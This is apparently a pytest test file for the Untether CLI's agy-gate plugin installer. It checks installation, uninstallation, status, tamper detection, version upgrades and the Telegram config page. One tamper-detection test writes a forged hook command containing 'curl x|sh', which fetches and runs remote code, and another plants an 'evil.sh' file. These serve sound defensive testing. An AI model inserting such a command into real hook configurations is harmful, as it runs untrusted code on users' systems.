"""``untether agy-gate install | uninstall | status`` (#980, R3-1).

agy's plugin manager is faked by a tiny script that copies / removes the
staged folder the way ``agy plugin install`` 1.3.3 does (probed in an
isolated ``HOME``: the whole folder is copied, ``.untether-managed``
included).
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest
from typer.testing import CliRunner

from tests.antigravity_gate_support import install_plugin
from untether.antigravity import gate_plugin
from untether.cli import create_app
from untether.runners.antigravity import AntigravityRunner
from untether.utils import antigravity_scan

FAKE = """#!{python}
import json, os, shutil, sys
from pathlib import Path
root = Path(os.environ["FAKE_PLUGIN_ROOT"])
log = Path(os.environ["FAKE_AGY_LOG"])
args = sys.argv[1:]
with log.open("a") as fh:
    fh.write(json.dumps(args) + "\\n")
if args[:1] != ["plugin"]:
    sys.exit(2)
cmd, rest = args[1], args[2:]
if os.environ.get("FAKE_FAIL") == cmd:
    print("boom", file=sys.stderr)
    sys.exit(1)
if cmd == "validate":
    sys.exit(0)
if cmd == "install":
    src = Path(rest[0])
    dst = root / src.name
    if dst.exists():
        shutil.rmtree(dst)
    shutil.copytree(src, dst)
    sys.exit(0)
if cmd == "uninstall":
    dst = root / rest[0]
    if dst.exists():
        shutil.rmtree(dst)
    print(f'Uninstalled plugin "{{rest[0]}}"')
    sys.exit(0)
sys.exit(3)
"""


@pytest.fixture
def fake_agy(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    script = tmp_path / "agy"
    script.write_text(FAKE.format(python=sys.executable))
    script.chmod(0o755)
    monkeypatch.setenv(
        "FAKE_PLUGIN_ROOT", str(antigravity_scan.user_config_dir() / "plugins")
    )
    monkeypatch.setenv("FAKE_AGY_LOG", str(tmp_path / "agy.log"))
    return script


def _calls(fake_agy: Path) -> list[list[str]]:
    log = fake_agy.parent / "agy.log"
    if not log.exists():
        return []
    return [json.loads(line) for line in log.read_text().splitlines()]


def test_install_writes_exactly_three_files_named_group(fake_agy: Path) -> None:
    state = gate_plugin.install(agy_cmd=str(fake_agy))
    folder = gate_plugin.plugin_dir()
    assert sorted(p.name for p in folder.iterdir()) == [
        ".untether-managed",
        "hooks.json",
        "plugin.json",
    ]
    assert state.ready and state.wait_s == gate_plugin.DEFAULT_WAIT_S
    hooks = json.loads((folder / "hooks.json").read_text())
    # agy needs a named top-level group (a flat manifest loads 0 hooks).
    assert list(hooks) == [gate_plugin.PLUGIN_NAME]
    group = hooks[gate_plugin.PLUGIN_NAME]
    assert set(group) == {"PreToolUse", "PreInvocation", "Stop"}
    pre = group["PreToolUse"][0]
    assert pre["matcher"] == "*"
    assert pre["hooks"][0]["timeout"] == 960
    for event in ("PreInvocation", "Stop"):
        assert group[event][0]["command"].startswith(
            '[ -n "$UNTETHER_AGY_GATE" ] || exit 0; '
            '[ -x "$UNTETHER_AGY_GATE_PY" ] || exit 0; '
            'exec "$UNTETHER_AGY_GATE_PY" -I -m'
        )
    manifest = json.loads((folder / ".untether-managed").read_text())
    assert manifest["protocol"] == 1 and manifest["wait_s"] == 900
    assert set(manifest["files"]) == {"plugin.json", "hooks.json"}
    # Through agy's own plugin manager (R3-1), validated first.
    verbs = [c[1] for c in _calls(fake_agy)]
    assert verbs == ["validate", "install"]


def test_install_custom_wait(fake_agy: Path) -> None:
    gate_plugin.install(agy_cmd=str(fake_agy), wait_s=600)
    hooks = json.loads((gate_plugin.plugin_dir() / "hooks.json").read_text())
    assert hooks[gate_plugin.PLUGIN_NAME]["PreToolUse"][0]["hooks"][0]["timeout"] == 660
    with pytest.raises(gate_plugin.GateInstallError):
        gate_plugin.plan_install(10)


def test_install_refuses_unmanaged_dir(fake_agy: Path) -> None:
    folder = gate_plugin.plugin_dir()
    folder.mkdir(parents=True)
    (folder / "hooks.json").write_text("{}")
    with pytest.raises(
        gate_plugin.GateInstallError, match="wasn't installed by Untether"
    ):
        gate_plugin.install(agy_cmd=str(fake_agy))
    assert (folder / "hooks.json").read_text() == "{}"
    assert _calls(fake_agy) == []
    gate_plugin.install(agy_cmd=str(fake_agy), force=True)
    assert gate_plugin.inspect_install().ready


def test_uninstall_refuses_modified_file(fake_agy: Path) -> None:
    folder = install_plugin()
    (folder / "hooks.json").write_text((folder / "hooks.json").read_text() + " ")
    state = gate_plugin.inspect_install()
    assert state.edited == ["hooks.json"] and not state.ready
    with pytest.raises(gate_plugin.GateInstallError, match=r"hooks\.json"):
        gate_plugin.uninstall(agy_cmd=str(fake_agy))
    assert folder.exists()
    assert gate_plugin.uninstall(agy_cmd=str(fake_agy), force=True) is True
    assert not folder.exists()
    assert gate_plugin.uninstall(agy_cmd=str(fake_agy)) is False


def test_extra_file_counts_as_edited(fake_agy: Path) -> None:
    folder = install_plugin()
    (folder / "evil.sh").write_text("#!/bin/sh\n")
    state = gate_plugin.inspect_install()
    assert "evil.sh" in state.edited and not state.ready


def test_disabled_plugin_not_ready(fake_agy: Path) -> None:
    install_plugin()
    gate_plugin.agy_plugin_state_path().write_text(
        json.dumps({"plugins": {"untether-gate": {"enabled": False}}})
    )
    state = gate_plugin.inspect_install()
    assert state.disabled is True and not state.ready
    assert "disabled" in state.summary()


def test_other_version_templates_not_current(fake_agy: Path) -> None:
    folder = install_plugin()
    stale = (folder / "plugin.json").read_bytes().replace(b'"2"', b'"0"')
    assert stale != (folder / "plugin.json").read_bytes()
    (folder / "plugin.json").write_bytes(stale)
    manifest = json.loads((folder / ".untether-managed").read_text())
    manifest["files"]["plugin.json"] = gate_plugin._sha256(stale)
    (folder / ".untether-managed").write_text(json.dumps(manifest))
    state = gate_plugin.inspect_install()
    assert state.managed and not state.edited and not state.current
    assert not state.ready


_V1_COMMAND = (
    '[ -n "$UNTETHER_AGY_GATE" ] || exit 0; '
    'exec "$UNTETHER_AGY_GATE_PY" -I -m untether.antigravity.gate_hook {event}'
)


def test_plugin_v1_install_reads_as_outdated(fake_agy: Path) -> None:
    """Security review 3 M3 changed the hook commands (plugin version 2): an
    install made by an earlier rc (version 1, no interpreter guard) is "not
    current", so Ask me refuses until ``untether agy-gate install`` runs."""
    folder = install_plugin()
    hooks = (folder / "hooks.json").read_text()
    for event in ("PreToolUse", "PreInvocation", "Stop"):
        hooks = hooks.replace(
            json.dumps(gate_plugin.hook_command(event))[1:-1],
            json.dumps(_V1_COMMAND.format(event=event))[1:-1],
        )
    plugin = (folder / "plugin.json").read_text().replace('"2"', '"1"')
    files = {"plugin.json": plugin.encode(), "hooks.json": hooks.encode()}
    for name, data in files.items():
        (folder / name).write_bytes(data)
    (folder / ".untether-managed").write_bytes(
        gate_plugin._manifest_bytes(files, gate_plugin.DEFAULT_WAIT_S)
    )
    state = gate_plugin.inspect_install()
    assert state.managed and not state.edited and not state.current
    assert not state.ready
    # Recognised as exactly what 0.36.1rc1 to rc3 wrote (the literal above is
    # that release's command), so it reads as an older install to update.
    assert state.previous_version == "1"
    assert files == gate_plugin.template_files(gate_plugin.DEFAULT_WAIT_S, "1")
    assert "earlier Untether" in state.summary()
    # Changed along with its record: never "outdated", always "changed".
    forged = hooks.replace("exec", "curl x|sh; exec").encode()
    (folder / "hooks.json").write_bytes(forged)
    (folder / ".untether-managed").write_bytes(
        gate_plugin._manifest_bytes(
            {**files, "hooks.json": forged}, gate_plugin.DEFAULT_WAIT_S
        )
    )
    forged_state = gate_plugin.inspect_install()
    assert not forged_state.edited and forged_state.previous_version is None
    from untether.antigravity import gate_precheck

    text = gate_precheck.reason_text(gate_precheck.OUTDATED)
    assert "untether agy-gate install" in text and "update it" in text


def test_agy_failure_reported(fake_agy: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("FAKE_FAIL", "install")
    with pytest.raises(gate_plugin.GateInstallError, match="boom"):
        gate_plugin.install(agy_cmd=str(fake_agy))
    assert not gate_plugin.plugin_dir().exists()


def test_cli_dry_run_writes_nothing(fake_agy: Path) -> None:
    result = CliRunner().invoke(create_app(), ["agy-gate", "install", "--dry-run"])
    assert result.exit_code == 0, result.output
    assert (
        "hooks.json" in result.output
        and "untether.antigravity.gate_hook" in result.output
    )
    assert not gate_plugin.plugin_dir().exists()
    assert _calls(fake_agy) == []


def test_cli_install_status_uninstall(fake_agy: Path) -> None:
    app = create_app()
    runner = CliRunner()
    result = runner.invoke(app, ["agy-gate", "install", "--agy", str(fake_agy)])
    assert result.exit_code == 0, result.output
    result = runner.invoke(app, ["agy-gate", "status"])
    assert result.exit_code == 0 and "State: installed" in result.output
    result = runner.invoke(app, ["agy-gate", "uninstall", "--agy", str(fake_agy)])
    assert result.exit_code == 0 and "Uninstalled." in result.output
    result = runner.invoke(app, ["agy-gate", "status"])
    assert result.exit_code == 1 and "not installed" in result.output


def test_cli_name_does_not_collide_with_engine_command() -> None:
    from untether.engines import list_backend_ids

    assert "agy-gate" not in list_backend_ids()
    result = CliRunner().invoke(create_app(), ["agy-gate", "--help"])
    assert result.exit_code == 0
    for verb in ("install", "uninstall", "status"):
        assert verb in result.output


# ── /config → 🔐 Telegram approvals (read-only, REVIEW-2 m3) ───────────────


def _config_ctx(args: str, tmp_path: Path, project: Path | None):
    from unittest.mock import AsyncMock, MagicMock

    ctx = MagicMock()
    ctx.args_text = args
    ctx.text = f"config:{args}"
    ctx.message.channel_id = 555
    ctx.config_path = tmp_path / "untether.toml"
    ctx.runtime.default_engine = "antigravity"
    ctx.runtime.default_context_for_chat.return_value = None
    ctx.runtime.project_default_engine.return_value = None
    ctx.ambient_context = None
    ctx.runtime.resolve_run_cwd.return_value = project
    ctx.executor = AsyncMock()
    ctx.trigger_manager = None
    return ctx


def _page(ctx):
    msg = ctx.executor.edit.call_args[0][1]
    data = [
        b["callback_data"]
        for row in msg.extra["reply_markup"]["inline_keyboard"]
        for b in row
    ]
    return msg.text, data


@pytest.mark.anyio
async def test_config_gt_page_read_only_shows_cli_commands(tmp_path: Path) -> None:
    from untether.telegram.commands.config import (
        ConfigCommand,
        classify_config_action,
    )

    ctx = _config_ctx("gt", tmp_path, None)
    await ConfigCommand().handle(ctx)
    text, data = _page(ctx)
    assert "not installed" in text
    for cmd in ("untether agy-gate install", "untether agy-gate uninstall"):
        assert cmd in text
    # No install / uninstall buttons exist: only Re-check and Back.
    assert data == ["config:gt:rc", "config:home"]
    assert classify_config_action("gt:rc") == "open"
    assert not gate_plugin.plugin_dir().exists()


@pytest.mark.anyio
async def test_config_gt_recheck_runs_hooks_listing(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from tests.antigravity_gate_support import hooks_listing
    from untether.antigravity import gate_precheck
    from untether.telegram.commands import config as config_mod

    install_plugin()
    gate_precheck.clear_cache()
    calls: list[Path] = []

    async def listing(runner: object, cwd: Path) -> dict[str, object]:
        calls.append(cwd)
        return hooks_listing()

    monkeypatch.setattr(gate_precheck, "_probe_hooks", listing)
    monkeypatch.setattr(
        config_mod,
        "_antigravity_runner_and_model",
        lambda ctx, m: (AntigravityRunner(), None),
    )
    project = tmp_path / "proj"
    project.mkdir()
    ctx = _config_ctx("gt", tmp_path, project)
    await config_mod.ConfigCommand().handle(ctx)
    text, _ = _page(ctx)
    assert "not checked yet" in text and calls == []
    ctx = _config_ctx("gt:rc", tmp_path, project)
    await config_mod.ConfigCommand().handle(ctx)
    text, _ = _page(ctx)
    assert calls == [project]
    assert "<b>installed</b>" in text and "<b>ready</b>" in text


@pytest.mark.anyio
async def test_config_gt_cached_ready_yields_to_an_edited_plugin(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """#1077: the page showed "This chat's project: ready" from a cached
    check under "Plugin: edited since install"."""
    from tests.antigravity_gate_support import hooks_listing
    from untether.antigravity import gate_precheck
    from untether.telegram.commands import config as config_mod

    install_plugin()
    gate_precheck.clear_cache()

    async def listing(runner: object, cwd: Path) -> dict[str, object]:
        return hooks_listing()

    monkeypatch.setattr(gate_precheck, "_probe_hooks", listing)
    monkeypatch.setattr(
        config_mod,
        "_antigravity_runner_and_model",
        lambda ctx, m: (AntigravityRunner(), None),
    )
    project = tmp_path / "proj"
    project.mkdir()
    ctx = _config_ctx("gt:rc", tmp_path, project)
    await config_mod.ConfigCommand().handle(ctx)
    assert "<b>ready</b>" in _page(ctx)[0]
    (gate_plugin.plugin_dir() / gate_plugin.HOOKS_FILE).write_text("{}")
    ctx = _config_ctx("gt", tmp_path, project)
    await config_mod.ConfigCommand().handle(ctx)
    text, _ = _page(ctx)
    assert "edited since install" in text
    assert "This chat's project: <b>not ready</b>" in text
    assert "<b>ready</b>" not in text


@pytest.mark.anyio
async def test_config_gt_reason_renders_commands_as_code(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """#1077: a reason's `agy plugin enable …` showed literal backticks."""
    from tests.antigravity_gate_support import hooks_listing
    from untether.antigravity import gate_precheck
    from untether.telegram.commands import config as config_mod

    install_plugin()
    gate_precheck.clear_cache()

    async def disabled(runner: object, cwd: Path) -> dict[str, object]:
        return hooks_listing(enabled=False)

    monkeypatch.setattr(gate_precheck, "_probe_hooks", disabled)
    monkeypatch.setattr(
        config_mod,
        "_antigravity_runner_and_model",
        lambda ctx, m: (AntigravityRunner(), None),
    )
    project = tmp_path / "proj"
    project.mkdir()
    ctx = _config_ctx("gt:rc", tmp_path, project)
    await config_mod.ConfigCommand().handle(ctx)
    text, _ = _page(ctx)
    assert "<code>agy plugin enable untether-gate</code>" in text
    assert "`" not in text
